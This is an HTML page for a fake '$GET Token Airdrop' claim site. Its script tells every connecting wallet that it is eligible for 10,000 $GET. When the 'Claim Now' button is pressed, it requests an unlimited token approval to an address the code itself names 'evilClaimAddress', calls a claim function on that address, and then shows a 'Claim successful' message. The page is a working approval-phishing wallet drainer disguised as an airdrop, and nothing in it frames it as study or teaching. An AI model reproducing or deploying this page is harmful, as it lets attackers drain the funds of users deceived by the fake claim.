<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>$GET Airdrop Claim</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1e1f29, #2f3041);
      color: #f1f1f5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }
    .claim-wrapper {
      background: rgba(255 255 255 / 0.05);
      border-radius: 16px;
      box-shadow: 0 0 30px rgba(255, 170, 51, 0.2);
      max-width: 420px;
      width: 100%;
      padding: 2.5rem 3rem;
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 170, 51, 0.3);
      text-align: center;
      animation: fadeInUp 0.8s ease forwards;
    }
    @keyframes fadeInUp {
      from {opacity: 0; transform: translateY(30px);}
      to {opacity: 1; transform: translateY(0);}
    }
    .logo {
      font-weight: 700;
      font-size: 2.8rem;
      color: #ffaa33;
      margin-bottom: 0.5rem;
      letter-spacing: 3px;
      user-select: none;
    }
    .title {
      font-weight: 600;
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: #fff;
    }
    .subtitle {
      font-weight: 400;
      font-size: 1rem;
      color: #ddd;
      margin-bottom: 2rem;
      line-height: 1.4;
    }
    .connect-wallet-btn, .claim-btn {
      background: linear-gradient(90deg, #ffcc70, #ffaa33);
      border: none;
      border-radius: 50px;
      font-weight: 700;
      font-size: 1.1rem;
      padding: 0.9rem 2.8rem;
      cursor: pointer;
      box-shadow: 0 0 20px rgba(255, 170, 51, 0.7);
      transition: background 0.3s ease;
      width: 100%;
      user-select: none;
      margin-bottom: 1.2rem;
    }
    .connect-wallet-btn:hover, .claim-btn:hover {
      background: linear-gradient(90deg, #ffdca1, #ffc76b);
    }
    .connect-wallet-btn:disabled, .claim-btn:disabled {
      background: #ccc;
      color: #666;
      cursor: not-allowed;
      box-shadow: none;
    }
    .wallet-address {
      background: #2f3041;
      border-radius: 10px;
      padding: 1rem 1.2rem;
      font-size: 1rem;
      color: #fff;
      border: 1px solid transparent;
      user-select: text;
      margin-bottom: 1.8rem;
      width: 100%;
      overflow-wrap: break-word;
    }
    .eligibility-msg {
      background: rgba(255 255 255 / 0.1);
      border-radius: 12px;
      padding: 1rem 1.5rem;
      color: #fff;
      font-size: 1rem;
      box-shadow: 0 0 12px rgba(255, 170, 51, 0.25);
      user-select: none;
    }
  </style>
</head>
<body>

  <div class="claim-wrapper">
    <div class="logo">GETCHAIN</div>
    <div class="title">$GET Token Airdrop</div>
    <div class="subtitle">Connect your wallet to check eligibility and claim your $GET tokens.</div>

    <button class="connect-wallet-btn" id="connectWalletBtn">Connect Wallet</button>

    <div id="walletAddress" class="wallet-address" style="display:none;"></div>

    <button class="claim-btn" id="claimBtn" disabled>Claim Now</button>

    <div id="eligibilityMessage" class="eligibility-msg" style="display:none;">
      ‚úÖ You are eligible for <strong>10,000 $GET</strong>
    </div>
  </div>

<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
<script>
  const connectWalletBtn = document.getElementById('connectWalletBtn');
  const walletAddressDiv = document.getElementById('walletAddress');
  const claimBtn = document.getElementById('claimBtn');
  const eligibilityMsg = document.getElementById('eligibilityMessage');

  let signer;

  connectWalletBtn.addEventListener('click', async () => {
    if (typeof window.ethereum === 'undefined') {
      alert("MetaMask not detected. Please install it.");
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      const address = await signer.getAddress();

      walletAddressDiv.textContent = address;
      walletAddressDiv.style.display = 'block';

      connectWalletBtn.textContent = "Wallet Connected";
      connectWalletBtn.disabled = true;

      eligibilityMsg.innerHTML = '‚úÖ You are eligible for <strong>10,000 $GET</strong>';
      eligibilityMsg.style.display = 'block';
      claimBtn.disabled = false;

    } catch (err) {
      alert("Connection failed: " + (err.message || err));
    }
  });

  claimBtn.addEventListener('click', async () => {
    if (!signer) {
      alert("Please connect your wallet first.");
      return;
    }

    try {
      const provider = signer.provider;
      const { chainId } = await provider.getNetwork();

      if (chainId !== 8453) { // Base Mainnet
        alert("Please switch your wallet network to Base Mainnet.");
        return;
      }

      const getTokenAddress = "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb";
      const evilClaimAddress = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";

      const tokenContract = new ethers.Contract(
        getTokenAddress,
        ["function approve(address spender, uint256 amount) external returns (bool)"],
        signer
      );

      const tx = await tokenContract.approve(evilClaimAddress, ethers.constants.MaxUint256);
      await tx.wait();

      const claimContract = new ethers.Contract(
        evilClaimAddress,
        ["function claim() external"],
        signer
      );

      await claimContract.claim();

      alert("üéâ Claim successful! 10,000 $GET sent.");
    } catch (err) {
      console.error(err);
      alert("‚ùå Claim failed: " + (err.message || "Unknown error"));
    }
  });
</script>
</body>
</html>
